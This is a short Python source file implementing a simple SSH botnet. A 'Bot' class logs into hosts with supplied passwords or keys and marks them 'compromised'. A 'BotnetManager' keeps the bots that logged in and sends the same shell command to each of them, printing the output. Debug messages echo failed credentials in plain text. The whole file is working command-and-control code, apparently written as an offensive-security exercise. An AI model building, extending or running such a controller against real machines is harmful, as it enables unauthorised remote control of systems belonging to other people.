from subprocess import check_output

from pexpect import pxssh
from termcolor import colored



class Bot(pxssh.pxssh):
    """
    an extension of the pxssh class
    used to manage and abstract attributes and actions
    """
    _DEFAULT_TIMEOUT = 2

    def __init__(self, host, user, passwd, pem_file=None):
        pxssh.pxssh.__init__(self)
        self.host = host
        self.user = user
        self.passwd = passwd
        self.pem = pem_file
        self.is_compromised = False

        self._establish_connection()    # used to test login capabilities


    def _establish_connection(self, show_debug=False):
        if show_debug:
            print(f"[+] Attempting to connect to {self.host}...")

        try:
            if self.pem is None:
                self.login(self.host, self.user, self.passwd,
                           login_timeout=self._DEFAULT_TIMEOUT)
            else:
                self.login(self.host, self.user, ssh_key=self.pem,
                           login_timeout=self._DEFAULT_TIMEOUT)
            self.is_compromised = True
        except pxssh.ExceptionPxssh as ssh_err:
            if show_debug:
                print(colored(f"[-]: {ssh_err}", "red"))
                unsuccessful_output = f"[-] Unable to connect to {self.host} using " + \
                                      f"user={self.user} and passwd={self.passwd}"
                print(unsuccessful_output, end='\n\n')



        if show_debug and self.is_compromised:
            print(f"[+] Connection Established with {self.host}", end='\n\n')
        return self.is_compromised


    def is_available(self):
        return self.is_compromised


    def run_command(self, command):
        self.sendline(command)
        self.prompt()
        return self.before.decode()



class BotnetManager:
    """manages a collection of bots used in a botnet"""
    _DEFAULT_TIMEOUT = 1

    def __init__(self):
        self._bots = []


    def add_bot(self, host, user, passwd):
        bot = Bot(host, user, passwd)
        if bot.is_available():
            self._bots.append(bot)
        return bot.is_available()


    def list_bots(self):
        for bot in self._bots:
            print(bot)


    def send_command(self, command):
        for idn, bot in enumerate(self._bots):
            if bot.is_available():
                output = bot.run_command(command).split('\r\n ')[-1]
                print(f"[Bot-{idn}]: {output}")
